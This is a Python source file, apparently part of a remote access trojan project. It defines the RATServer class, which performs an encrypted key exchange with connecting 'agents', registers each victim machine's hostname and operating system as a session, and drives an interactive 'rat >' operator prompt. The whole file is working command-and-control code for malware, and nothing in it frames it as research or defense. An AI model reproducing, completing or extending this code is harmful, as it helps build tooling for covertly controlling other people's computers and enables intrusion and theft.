import threading

from src.utils.logger import setup_logger
from src.utils.crypto import gen_keypair, derive_shared_key
from src.utils.lib import send_raw, recv_raw, recv_msg
from src.utils.protocol import parse_msg
from src.server.session import Session

log = setup_logger("server")


class RATServer:
    def __init__(self):
        self.sessions = {}
        self._lock = threading.Lock()
        self._next_id = 0

    def handle_new_agent(self, conn, addr):
        try:
            priv, pub_bytes = gen_keypair()
            send_raw(conn, pub_bytes)

            agent_pub = recv_raw(conn)
            key = derive_shared_key(priv, agent_pub)
            log.debug(f"Cle derivee pour {addr}")

            raw = recv_msg(conn, key)
            info = parse_msg(raw)

            with self._lock:
                agent_id = self._next_id
                self._next_id += 1
                sess = Session(agent_id, conn, addr, key)
                sess.os_info = info.get("payload", {}).get("os", "?")
                sess.hostname = info.get("payload", {}).get("hostname", "?")
                self.sessions[agent_id] = sess

            log.info(f"Agent {agent_id} enregistre - {sess.hostname} ({sess.os_info})")
            print(f"\n[+] Nouvel agent : {sess}\nrat > ", end="", flush=True)

        except Exception as e:
            log.error(f"Erreur handshake {addr}: {e}")
            conn.close()

    def remove_session(self, agent_id):
        with self._lock:
            sess = self.sessions.pop(agent_id, None)
        if sess:
            sess.close()
            log.info(f"Agent {agent_id} deconnecte")
            print(f"\n[-] Agent {agent_id} deconnecte\nrat > ", end="", flush=True)

    def get_session(self, agent_id):
        return self.sessions.get(agent_id)

    def list_sessions(self):
        with self._lock:
            return list(self.sessions.values())
